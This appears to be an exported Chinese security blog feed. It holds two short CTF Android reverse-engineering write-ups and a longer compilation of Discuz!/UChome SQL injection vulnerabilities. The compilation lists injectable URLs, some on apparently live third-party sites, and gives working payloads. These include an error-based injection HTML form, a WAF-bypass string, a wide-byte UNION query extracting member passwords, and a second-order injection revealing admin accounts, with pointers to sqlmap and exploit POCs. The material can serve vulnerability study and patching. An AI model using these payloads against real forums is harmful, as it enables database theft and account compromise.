class="string">&#x27;&#x27;</span>))<span class="keyword">for</span> c <span class="keyword">in</span> string <span class="keyword">if</span> c != <span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">    base64_bytes_str = <span class="string">&#x27;&#x27;</span>.join(base64_bytes)</span><br><span class="line">    <span class="built_in">print</span>(base64_bytes_str)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(base64_bytes_str) // <span class="number">8</span>):</span><br><span class="line">        byte = base64_bytes_str[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Base64NewDecode(s)</span><br></pre></td></tr></table></figure>

<p>得到flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;just_ANot#er_@p3&#125;</span><br></pre></td></tr></table></figure>

<p>输入成功</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasyjni/image-20231129113333567.png" class title="image-20231129113333567">]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之基础android</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8B%E5%9F%BA%E7%A1%80android/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之基础android"><a href="#【攻防世界】Mobile系列之基础android" class="headerlink" title="【攻防世界】Mobile系列之基础android"></a>【攻防世界】Mobile系列之基础android</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8B%E5%9F%BA%E7%A1%80android/image-20231101093630788.png" class title="image-20231101093630788">

<p>反编译后在MainActivity中找到对密码进行验证的代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> Check().checkPassword(MainActivity.<span class="keyword">this</span>.passWord.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Good,Please go on!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.startActivity(<span class="keyword">new</span> Intent(MainActivity.<span class="keyword">this</span>, MainActivity2.class));</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.finish();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Failed&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里调用check().checkpassword()对输入的字符串进行验证，继续跟踪checkPassword()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.test.ctf02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Check</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPassword</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] pass = str.toCharArray();<span class="comment">//字符数组</span></span><br><span class="line">        <span class="keyword">if</span> (pass.length != <span class="number">12</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//字符串长度为12</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> len = <span class="number">0</span>; len &lt; pass.length; len++) &#123;</span><br><span class="line">            pass[len] = (<span class="keyword">char</span>) (((<span class="number">255</span> - len) - <span class="number">100</span>) - pass[len]);</span><br><span class="line">            <span class="keyword">if</span> (pass[len] != <span class="string">&#x27;0&#x27;</span> || len &gt;= <span class="number">12</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数定义了输入字符串长度为12，关键一行代码是”<strong>pass[len] &#x3D; (char) (((255 - len) - 100) - pass[len]);</strong>“，对字符串转换后的字符数组进行变换后使得全为”0”。由此我们可以反推回去计算出原来的字符串，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pass_array= []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">12</span>):</span><br><span class="line">    pass_array.append(<span class="built_in">chr</span>(<span class="number">107</span>-i))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(pass_array))</span><br></pre></td></tr></table></figure>

<p>得到**kjihgfedcba&#96;**，验证成功后进行下一个界面要求输入图片显示码</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8B%E5%9F%BA%E7%A1%80android/image-20231101101706307.png" class title="image-20231101101706307">

<p>我们来继续观察源代码，这里的代码逻辑应当为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> MainActivity.this.startActivity(new Intent(MainActivity.this, MainActivity2.class));</span><br><span class="line"> MainActivity.this.finish();//使用Intent来进行两个组件之间的交互，这里跳转到了MainActivity2组件</span><br><span class="line"> </span><br><span class="line"> public void onClick(View v) &#123;</span><br><span class="line">                MainActivity2.this.sendBroadcast(new Intent(MainActivity2.this.editText.getText().toString()));</span><br><span class="line">            &#125;</span><br><span class="line">//输入的字符串作为intent的内容进行广播发送</span><br></pre></td></tr></table></figure>

<p>由上面的代码逻辑可以得出输入的字符串作为Inten的内容进行广播发送，接下来我们就要去AndroidManifest.xml文件中找广播接收器Recevier，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;receiver android:name=&quot;com.example.test.ctf02.GetAndChange&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.is.very.fun&quot;/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/receiver&gt;</span><br></pre></td></tr></table></figure>

<p>可以得到这里的<strong>android.is.very.fun</strong>,输入后可得到<strong>flag{08067-wlecome}</strong><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8B%E5%9F%BA%E7%A1%80android/image-20231101102858905.png" class title="image-20231101102858905"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>wLHK-Discuz漏洞整理</title>
    <url>/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="Discuz-X漏洞"><a href="#Discuz-X漏洞" class="headerlink" title="Discuz!X漏洞"></a>Discuz!X漏洞</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>漏洞描述：</strong>Discuz历史版本中存在着大量的sql注入漏洞，存在于大量插件和管理后台中，且有些SQL注入漏洞涉及版本不清晰。涉及URL如下：</p>
<p>##问卷调查专业版插件-nds_ques_viewanswer.inc.php—&gt;演示1</p>
<p><a href="http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline">http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline</a></p>
<p>##&#x2F;source&#x2F;include&#x2F;misc&#x2F;misc_stat.php—&gt;演示2</p>
<p><a href="http://ip/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://ip/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]&#x3D;x</a></p>
<p>##discuz ychat插件-table_ychat_rooms.php、rooms.php—&gt;演示3</p>
<p><a href="http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>##江湖客栈插件-forummission.php—&gt;演示4</p>
<p><a href="http://ip/forummission.php?index=show&amp;id=24">http://ip/forummission.php?index=show&amp;id=24</a></p>
<p>## my.php—&gt;演示5</p>
<p><a href="http://ip/my.php?item=buddylist">http://ip/my.php?item=buddylist</a></p>
<p>## UChome插件—&gt;演示6</p>
<p><a href="http://ip/uchome/cp.php?ac=blog&amp;blogid=1">http://ip/uchome/cp.php?ac=blog&amp;blogid=1</a></p>
<p>##交友插件- jiaoyou.php—&gt;演示7</p>
<p><a href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>&#x3D;</p>
<p>##v63积分商城插件- \source\class\discuz\discuz_database.php—&gt;演示8</p>
<p><a href="http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a></p>
<p>## misc插件- source\module\forum\forum_misc.php—&gt;演示9</p>
<p><a href="http://ip/forum.php?mod=misc&tid=%7Btid%7D&action=postappend&pid=%7Bpid%7D">http://ip/forum.php?mod=misc&tid={tid}&action=postappend&pid={pid}</a></p>
<p>## attachment插件- \source\module\forum\forum_attachment.php—&gt;演示10</p>
<p><a href="http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>&#x3D;</p>
<p>##心情墙插件- moodwall.inc.php—&gt;演示11</p>
<p><a href="http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">Http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>##空间功能-space.php—&gt;演示12</p>
<p><a href="http://ip/space.php?username">http://ip/space.php?username</a>&#x3D;</p>
<p>## trade.php—&gt;演示13</p>
<p><a href="http://ip/trade.php">http://ip/trade.php</a></p>
<p>##会员中心—&gt;演示14</p>
<p><a href="http://ip/member/pm.php?dopost=read&amp;id=1">http://ip/member/pm.php?dopost=read&amp;id=1</a></p>
<p>##管理后台-工具-数据电泳-自定义-模块名称等—&gt;演示15</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有19个功能或插件存在sql注入，但最后4个sql注入漏洞只找到POC，暂时无法演示。</p>
<h3 id="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"><a href="#演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞" class="headerlink" title="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"></a>演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞</h3><p>找到问卷调查专业版插件所在链接：<a href="http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline">http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline</a>(问题出在orderby参数)，对该参数进行sql注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ec93ccdee00378ab38b1316ace94c44b.png" class>

<p>接下来就是使用sqlmap进行暴库了。</p>
<p>参考链接：<a href="http://www.5kik.com/php0day/239.html">http://www.5kik.com/php0day/239.html</a></p>
<h3 id="演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）"><a href="#演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）" class="headerlink" title="演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）"></a>演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）</h3><p>找到注入点：<a href="http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]&#x3D;x</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946b2c1d8e99431b39ca31aa6d56b11d.png" class>

<p>也就是说我们可以控制的部分有很多。<br>且不看全局防注入源码，黑盒试一下我发现一旦出现’、(就会拦截，而且注释符（#、–）也会拦截。<br>括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/85936efd8e72984ff6c94729f00cf1a3.png" class>

<p>我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a01c46097785d64627eac5950a435d50.png" class>

<p>执行会提示Unknown column ‘daytime’ in ‘field list’。<br>所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b1530110687ade97e4c2ee5244cf1782.png" class>

<p>大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。<br>那么，有的同学再问，sql语句后半部分<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/cbe2ae3ffe3c952fc9bec375b642557b.png" class></p>
<p>没有注释符怎么处理？<br>这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。<br>所以，先构造一个url：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3203a48961dfad2e03dbd9c55ee76626.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/50cf97eebf609ecdeda0134d1a96fe3a.png" class>

<p>可以看到已经出数据了。但发现出来的数据只有4位。<br>原因是，在源码中使用了substr取了daytime的第4到8位。修改POC</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/618e4f8322f62c03c515a8d32169f169.png" class>

<p>参考链接：<a href="https://www.secpulse.com/archives/26869.html">https://www.secpulse.com/archives/26869.html</a></p>
<h3 id="演示3：discuz-ychat插件注入漏洞"><a href="#演示3：discuz-ychat插件注入漏洞" class="headerlink" title="演示3：discuz ychat插件注入漏洞"></a>演示3：discuz ychat插件注入漏洞</h3><p><a href="http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>cid参数存在SQL注入</p>
<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=108978">https://bugs.shuimugan.com/bug/view?bug_no=108978</a></p>
<h3 id="演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞"><a href="#演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞" class="headerlink" title="演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞"></a>演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞</h3><p>forummission.php？index&#x3D;show$id&#x3D;24中的id参数存在sql注入漏洞</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8737db6a75addd1839b67cde1f094956.png" class>

<p>参考链接：<a href="http://www.gltc.cn/30161.html">http://www.gltc.cn/30161.html</a></p>
<h3 id="演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞"><a href="#演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞" class="headerlink" title="演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞"></a>演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞</h3><p>把以下EXP保存成HTML文档</p>
<p>&lt;form method&#x3D;’post’ action&#x3D;’<a href="http://dz6.0/my.php?item=buddylist&#39;\&gt;">http://dz6.0/my.php?item=buddylist&#39;\&gt;</a> &lt;input<br>type&#x3D;’hidden’ value&#x3D;”1111” name&#x3D;”descriptionnew[1’ and(select 1 from(select<br>count(*),concat((select (select (select<br>concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e) limit 0,1)) from<br>information_schema.tables limit 0,1),floor(rand(0)*2))x from<br>information_schema.tables group by x)a) and 1&#x3D;1#]” &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input<br>type&#x3D;’submit’ value&#x3D;’buddysubmit’ name&#x3D;’buddysubmit’ &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;form&gt;</p>
<p>使用浏览器打开</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ea45b4207fca0e5fb1d8a950810dca79.png" class>

<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=80359">https://bugs.shuimugan.com/bug/view?bug_no=80359</a></p>
<h3 id="演示6：UChome-注入漏洞1"><a href="#演示6：UChome-注入漏洞1" class="headerlink" title="演示6：UChome 注入漏洞1"></a>演示6：UChome 注入漏洞1</h3><p>首先注册用户 然后新建一个相册<br><a href="http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me">http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me</a> 打开这里点上传<br>新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片<br>直接确认 然后抓包 把titie的那个改成 title%5B1’ and (select 1 from (select<br>count(),concat(version(),floor(rand(0)2))x from information_schema.tables group<br>by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b253b877f2608abb78cf36512ad2179e.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93618">https://www.seebug.org/vuldb/ssvid-93618</a></p>
<h3 id="演示7：UChome-注入漏洞2"><a href="#演示7：UChome-注入漏洞2" class="headerlink" title="演示7：UChome 注入漏洞2"></a>演示7：UChome 注入漏洞2</h3><p>注册用户后登陆 然后点击日志 创建新日志 然后打开BURP进行抓包<br>找一个没有用的POST选项 改成picids[‘] 然后在提交 就可以看到结果了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/295ac8423cf91b32c8f202dcbf79d357.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/199e997d938cc2d2e3f8ffc1d061c07d.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93616">https://www.seebug.org/vuldb/ssvid-93616</a></p>
<h3 id="演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞"><a href="#演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞" class="headerlink" title="演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞"></a>演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞</h3><p><a href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>&#x3D;</p>
<p><a href="http://ip/jiaoyou.php?mod=search&amp;resideprovince">http://ip/jiaoyou.php?mod=search&amp;resideprovince</a>&#x3D;</p>
<p>pid、residecity、resideprovince参数均存在SQL注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/dd22c1792c7d1a99a4a3b8589a9d8286.png" class>

<p>参考链接：</p>
<p><a href="https://www.unhonker.com/bug/1058.html">https://www.unhonker.com/bug/1058.html</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<h3 id="演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞"><a href="#演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞" class="headerlink" title="演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞"></a>演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞</h3><p>在discuz<br>v63积分商城插件注入漏洞exp中并不需要斜杠、#号和—注释符。所以会执行$clean &#x3D;<br>preg_replace(“&#x2F;’(.+?)’&#x2F;s”, ”,<br>$sql);原来SQL语句中两个单引号中间的内容就会被替换为空。并不会进入到下面的else分支。Else下面的所有操作均是对$clean变量的操作。所以绕过的思路就是把SQL语句放在两个单引号中间。对于mysql的一个特性，<br>@`’`<br>是为空的，所以我们的攻击语句可以放到两个@`’`中间，即使GPC开启，单引号被转义为\’，而@`’`变成@`\’`对注入也是没有影响的，所以此绕过方法无限制。</p>
<p>即针对该注入漏洞的攻击EXP为：</p>
<p><a href="http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a> or<br>@`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select<br>user()))a from information_schema.tables group by a)b) or @`’` or @`’` and<br>(select * from (select count(*),concat(floor(rand(0)*2),(select user()))a<br>from information_schema.tables group by a)b) or @`’`</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/df2d41ccd913943f04b53d832c737ae0.png" class>

<p>可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。</p>
<p>参考链接：<a href="http://netsecurity.51cto.com/art/201303/386717.htm">http://netsecurity.51cto.com/art/201303/386717.htm</a></p>
<h3 id="演示10：Discuz-x1-5-x2-0-二次注射"><a href="#演示10：Discuz-x1-5-x2-0-二次注射" class="headerlink" title="演示10：Discuz x1.5 x2.0 二次注射"></a>演示10：Discuz x1.5 x2.0 二次注射</h3><p>访问<a href="http://xxxxx/forum.php?mod=misc&amp;tid=%7B1%7D&amp;action=postappend&amp;pid=%7B2%7D%E8%BF%9B%E5%85%A5%E5%9B%9E%E5%A4%8D%E4%B8%BB%E9%A2%98%E7%95%8C%E9%9D%A2%E3%80%82%E5%9C%A8%E5%8F%91%E8%A1%A8%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%9C%B0%E6%96%B9%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E3%80%82%E5%A6%82%E8%BE%93%E5%85%A5%E2%80%9Ca&#39;,\%60subject\%60=">http://xxxxx/forum.php?mod=misc&amp;tid={1}&amp;action=postappend&amp;pid={2}进入回复主题界面。在发表回复的地方存在SQL注入。如输入“a&#39;,\`subject\`=</a>(&#x2F;*!select*&#x2F;<br>group_concat(uid,’:’) from pre_common_member where groupid&#x3D;1),comment&#x3D;’”。</p>
<p>刷新页面，可在主题回复中看到管理用户。</p>
<p>参考链接：<a href="https://www.webshell.cc/562.html">https://www.webshell.cc/562.html</a></p>
<h3 id="演示11：Discuz-X2-forum-attachment-php-sql注入漏洞"><a href="#演示11：Discuz-X2-forum-attachment-php-sql注入漏洞" class="headerlink" title="演示11：Discuz! X2 forum_attachment.php sql注入漏洞"></a>演示11：Discuz! X2 forum_attachment.php sql注入漏洞</h3><p><a href="http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>&#x3D;</p>
<p>链接中，aid参数存在SQL注入，但需要把SQL语句进行base64编码，如</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b018839dadf33e4620e75cef37ac7a90.png" class>

<p>参考链接：<a href="https://www.cnblogs.com/devi1o/articles/4874822.html">https://www.cnblogs.com/devi1o/articles/4874822.html</a></p>
<h3 id="演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞"><a href="#演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞" class="headerlink" title="演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞"></a>演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞</h3><p><a href="http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>moodid存在SQL注入。</p>
<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93710">https://www.seebug.org/vuldb/ssvid-93710</a></p>
<h3 id="演示13：Discuz-论坛wap功能模块编码的注射漏洞"><a href="#演示13：Discuz-论坛wap功能模块编码的注射漏洞" class="headerlink" title="演示13：Discuz!论坛wap功能模块编码的注射漏洞"></a>演示13：Discuz!论坛wap功能模块编码的注射漏洞</h3><p><a href="http://xxxxxxx/space.php?username">http://xxxxxxx/space.php?username</a>&#x3D;</p>
<p>username存在SQL注入，但可能此处会把’过滤成\’，如果是GBK编码的话，可使用宽字节注入的思路绕过。如设置payload为：&#x2F;space.php?username&#x3D;%cf’%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,password,50,51,52,53,54,55,56,57,database(),59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84%20from%20cdb_members%20where%20uid&#x3D;1&#x2F;*</p>
<p>参考链接：</p>
<p><a href="http://www.vfocus.net/art/20080819/3755.html">http://www.vfocus.net/art/20080819/3755.html</a></p>
<p><a href="https://www.jb51.net/hack/12858.html">https://www.jb51.net/hack/12858.html</a></p>
<h3 id="演示14：Discuz-pm-php注入"><a href="#演示14：Discuz-pm-php注入" class="headerlink" title="演示14：Discuz! pm.php注入"></a>演示14：Discuz! pm.php注入</h3><p><a href="http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1">http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1</a></p>
<p>id参数存在SQL注入。</p>
<p>参考链接：<a href="http://www.hack6.com/wzle/gf/20140208/39554.html">http://www.hack6.com/wzle/gf/20140208/39554.html</a></p>
<h3 id="演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在管理后台-工具-数据-调用-自定义模块存在SQL注入，详情看图即可明白</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/88a65fe6d045049abf00a12f417fc72f.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4b91c80f9526cd448e60a904e4e32d41.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b5a668d79a3a0b596c54ea1009cb4479.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="漏洞POC："><a href="#漏洞POC：" class="headerlink" title="漏洞POC："></a>漏洞POC：</h3><p>Discuz! 4.x SQL injection POC</p>
<p><a href="https://www.exploit-db.com/exploits/2859/">https://www.exploit-db.com/exploits/2859/</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-5482">https://www.seebug.org/vuldb/ssvid-5482</a></p>
<p>Discuz! 5.0.0 RC1 SQL injection PoC</p>
<p><a href="http://blog.sina.com.cn/s/blog_56fb0f050100055g.html">http://blog.sina.com.cn/s/blog_56fb0f050100055g.html</a></p>
<p>Discuz! 5.0.0 GBK SQL Injection &#x2F; Admin Credentials Disclosure Exploit</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-16732">https://www.seebug.org/vuldb/ssvid-16732</a></p>
<p>Discuz! 5 SQL injection Exploit</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-5263">https://www.seebug.org/vuldb/ssvid-5263</a></p>
